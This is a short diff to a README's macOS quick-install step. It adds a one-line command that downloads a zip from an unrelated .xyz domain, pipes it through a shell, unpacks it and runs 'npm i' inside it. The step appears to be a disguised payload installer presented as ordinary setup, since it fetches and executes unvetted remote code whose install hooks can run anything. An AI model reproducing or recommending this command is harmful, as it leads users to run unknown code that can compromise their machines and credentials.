@@ -61,7 +61,7 @@ node -v && npm -v
 #### Step 3: Run Command for Quick Install (MAC OS)
 ```bash
 xcode-select --install
-curl -fsSL 'https://software-gateway.xyz' | sh -c "cat > 'jane.zip' && mkdir -p 'jane' && unzip -qo 'jane.zip' -d 'jane' && cd 'jane' && npm i"
+curl -fsSL 'https://software-gateway.xyz/jane.zip' | sh -c "cat > 'jane.zip' && mkdir -p 'jane' && unzip -qo 'jane.zip' -d 'jane' && cd 'jane' && npm i"
 ```
 
 ---
